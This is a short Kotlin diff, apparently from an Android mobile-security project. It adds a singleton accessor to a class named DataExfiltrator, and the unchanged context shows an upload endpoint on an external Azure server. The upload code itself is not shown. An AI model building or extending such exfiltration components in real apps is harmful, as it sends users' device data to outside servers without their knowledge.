@@ -13,6 +13,19 @@ import java.net.URL
 
 class DataExfiltrator(private val context: Context) {
 
+    companion object {
+        @Volatile
+        private var instance: DataExfiltrator? = null
+
+        fun getInstance(context: Context): DataExfiltrator {
+            return instance ?: synchronized(this) {
+                instance ?: DataExfiltrator(context.applicationContext).also {
+                    instance = it
+                }
+            }
+        }
+    }
+
     // Use the same server endpoint as MainActivity
     private val serverUrl = "https://mob-sec-server-esfnggbegggcfye9.southeastasia-01.azurewebsites.net/upload"
 
